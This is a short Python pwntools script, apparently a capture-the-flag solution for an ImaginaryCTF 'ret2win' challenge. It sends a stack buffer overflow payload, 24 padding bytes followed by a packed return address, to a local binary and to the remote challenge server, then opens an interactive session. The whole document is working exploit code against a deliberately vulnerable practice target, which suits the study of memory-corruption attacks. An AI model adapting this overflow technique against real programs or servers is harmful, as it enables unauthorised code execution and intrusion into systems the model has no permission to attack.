from pwn import *

p = process('./vuln')
p = remote('ret2win.chal.imaginaryctf.org', 1337)

padding = b'A'*24
win_adr = p64(0x4011d6)
payload = padding + win_adr

p.recv()
p.sendline(payload)
p.interactive()
